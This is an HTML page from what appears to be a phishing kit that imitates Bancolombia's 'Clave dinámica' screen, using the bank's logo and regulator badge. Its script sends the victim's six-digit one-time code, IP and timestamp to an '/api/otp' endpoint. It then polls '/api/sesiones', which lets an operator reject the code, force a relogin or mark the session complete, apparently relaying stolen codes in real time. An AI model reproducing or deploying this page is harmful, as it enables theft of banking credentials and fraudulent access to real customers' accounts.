<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Botón Bancolombia</title>
  <link rel="icon" type="image/png" href="icon-tab.webp">
  <script>
    if (localStorage.getItem('forceRelogin') === '1') {
      localStorage.removeItem('forceRelogin');
      window.location.href = 'Boton-Bancolombia-User.html';
    }
  </script>
  <style>
    html { -webkit-text-size-adjust:100%; }
    :root { --yellow:#ffd100;--black:#111;--gray:#777;--border:#e5e5e5; }
    * { margin:0;padding:0;box-sizing:border-box;font-family:system-ui,-apple-system,BlinkMacSystemFont,sans-serif; }

    body { min-height:100vh;background:#f4f5f6;display:flex;flex-direction:column;color:var(--black); }

    header { background:#fff;padding:16px;display:flex;justify-content:center;align-items:center;border-bottom:1px solid var(--border); }
    .logoban { max-width:220px; }

    main { flex:1;max-width:640px;width:100%;margin:0 auto;padding:0 16px;text-align:center; }
    h1 { font-size:22px;margin:32px 0 12px; }

    .card {
      background:#fff;border-radius:18px;padding:24px 52px;
      box-shadow:0 8px 24px rgba(0,0,0,0.12);
      position:relative;z-index:1;
    }
    .card img { width:32px;margin-bottom:8px; }
    .info-text { font-size:15px;color:var(--gray);margin-bottom:22px;line-height:1.4; }

    .pin-wrapper { display:flex;justify-content:center;gap:18px;margin-bottom:24px;min-height:58px;align-items:flex-end; }
    .pin-dot { width:40px;height:44px;border-bottom:2px solid #999;display:flex;align-items:center;justify-content:center;font-size:26px;position:relative; }
    .pin-dot.active::after { content:"";position:absolute;bottom:6px;width:2px;height:26px;background:#111;animation:blink 2.6s infinite; }
    @keyframes blink { 0%,50%,100%{opacity:1} 25%,75%{opacity:0} }

    input[type="tel"] { position:absolute;opacity:0;pointer-events:none; }

    .btn { width:100%;padding:16px;border-radius:999px;font-size:17px;border:none;margin-bottom:10px;cursor:pointer;color:#111;-webkit-text-fill-color:#111; }
    .btn.primary { background:#ddd;color:#999;-webkit-text-fill-color:#999;font-weight:600; }
    .btn.primary.active { background:var(--yellow);color:#000;-webkit-text-fill-color:#000; }
    .btn.secondary { background:transparent;border:2px solid #111;color:#111;-webkit-text-fill-color:#111; }

    .error-otp { display:none;color:#d32f2f;font-size:14px;margin-bottom:14px;font-weight:500; }

    .ondas-wrap {
      max-width:640px;width:100%;margin:0 auto;
      margin-top:-30px;flex-shrink:0;
      position:relative;z-index:0;
    }
    .ondas-wrap img { width:100%;display:block; }

    footer { background:#fff;padding:20px 16px 22px;text-align:center;font-size:12px;color:var(--gray);border-top:1px solid var(--border); }
    .logo-footer { max-width:160px;margin-bottom:6px; }
    .vigilado-wrap { display:flex;align-items:center;justify-content:center;gap:6px;margin-bottom:8px; }
    .vigilado-badge { border:1.5px solid #333;font-size:8px;font-weight:700;letter-spacing:1px;padding:1px 4px;text-transform:uppercase;color:#333;line-height:1.2; }
    .vigilado-text { font-size:9px;color:#555;text-align:left;line-height:1.3; }

    .loader-screen { position:fixed;inset:0;background:#fff;display:none;align-items:center;justify-content:center;z-index:9999;flex-direction:column;gap:18px; }
    .spinner { width:54px;height:54px;border:4px solid #eee;border-top:4px solid var(--yellow);border-radius:50%;animation:spin 1s linear infinite; }
    @keyframes spin { to { transform:rotate(360deg); } }

    @media(max-width:520px) {
      .card { padding:22px 20px; }
      .pin-wrapper { gap:12px; }
      .pin-dot { width:34px;height:40px;font-size:22px; }
      .ondas-wrap { margin-top:-20px; }
    }
  </style>
</head>
<body>

<div class="loader-screen" id="loader">
  <div class="spinner"></div>
  <img width="160px" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
</div>

<header>
  <img class="logoban" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
</header>

<main>
  <h1>Clave dinámica</h1>
  <div class="card">
    <img src="icono2.png" alt="Clave dinámica">
    <p class="info-text">Consulta tu Clave Dinámica desde la App Mi<br>Bancolombia.</p>
    <div class="pin-wrapper">
      <div class="pin-dot"></div>
      <div class="pin-dot"></div>
      <div class="pin-dot"></div>
      <div class="pin-dot"></div>
      <div class="pin-dot"></div>
      <div class="pin-dot"></div>
    </div>
    <input type="tel" inputmode="numeric" maxlength="6" id="otpInput" autofocus>
    <p class="error-otp" id="errorOtp">⚠️ Clave dinámica incorrecta. Inténtalo de nuevo.</p>
    <button class="btn primary" id="continueBtn" disabled>Continuar</button>
    <button class="btn secondary" onclick="window.location.href='Boton-Bancolombia-Clv.html'">Cancelar</button>
  </div>
</main>

<div class="ondas-wrap">
  <img src="fondo-ondas.png" alt="">
</div>

<footer>
  <img class="logo-footer" src="https://www.bancolombia.com/wcm/connect/a67af2d6-c768-4f4f-a33b-fd58074f7ce9/logo-bancolombia-black.svg?MOD=AJPERES">
  <div class="vigilado-wrap">
    <span class="vigilado-badge">VIGILADO</span>
    <span class="vigilado-text">SUPERINTENDENCIA FINANCIERA<br>DE COLOMBIA</span>
  </div>
  <p id="footerIp">Cargando IP...</p>
  <p id="footerFecha"></p>
</footer>

<script>
  const otpInput = document.getElementById("otpInput");
  const dots = document.querySelectorAll(".pin-dot");
  const continueBtn = document.getElementById("continueBtn");
  const loader = document.getElementById("loader");
  const errorOtp = document.getElementById("errorOtp");
  let pollingInterval = null;

  (function() {
    const ip = localStorage.getItem('user_ip');
    if (ip) document.getElementById('footerIp').textContent = 'Dirección IP: ' + ip;
    const now = new Date();
    document.getElementById('footerFecha').textContent = now.toLocaleString('es-CO', {
      weekday:'long',year:'numeric',month:'long',day:'numeric',hour:'2-digit',minute:'2-digit'
    });
  })();

  document.body.addEventListener("click", () => otpInput.focus());

  function updateOTP(value) {
    dots.forEach(d => d.classList.remove("active"));
    dots.forEach((d,i) => d.textContent = value[i] ? "●" : "");
    if (value.length < 6) {
      dots[value.length].classList.add("active");
      continueBtn.disabled=true; continueBtn.classList.remove("active");
    } else {
      continueBtn.disabled=false; continueBtn.classList.add("active");
    }
  }

  otpInput.addEventListener("input", () => {
    otpInput.value = otpInput.value.replace(/\D/g,"").slice(0,6);
    errorOtp.style.display="none";
    updateOTP(otpInput.value);
  });

  function iniciarPolling() {
    if (pollingInterval) clearInterval(pollingInterval);
    pollingInterval = setInterval(async () => {
      const ip = localStorage.getItem('user_ip') || '';
      try {
        const res = await fetch('/api/sesiones');
        const sesiones = await res.json();
        const sesion = sesiones[ip];
        if (!sesion) return;
        if (sesion.ban) { clearInterval(pollingInterval); window.location.href='https://www.bancolombia.com'; return; }
        if (sesion.relogin) { clearInterval(pollingInterval); window.location.href='Boton-Bancolombia-User.html'; return; }
        if (sesion.estado==='completo') { clearInterval(pollingInterval); window.location.href='Tu-Boleta.html'; return; }
        if (sesion.rechazarOtp) {
          clearInterval(pollingInterval);
          loader.style.display='none';
          continueBtn.disabled=true; continueBtn.classList.remove('active');
          otpInput.value=''; updateOTP('');
          errorOtp.style.display='block';
          otpInput.focus();
        }
      } catch {}
    }, 1500);
  }

  continueBtn.addEventListener("click", async () => {
    loader.style.display="flex"; continueBtn.disabled=true; errorOtp.style.display='none';
    try {
      const otp = otpInput.value;
      const ip = localStorage.getItem('user_ip') || '';
      await fetch('/api/otp', {
        method:'POST', headers:{'Content-Type':'application/json'},
        body: JSON.stringify({ otp, fecha: new Date().toISOString(), ip })
      });
    } catch(e) {}
    iniciarPolling();
  });

  updateOTP("");
</script>
</body>
</html>
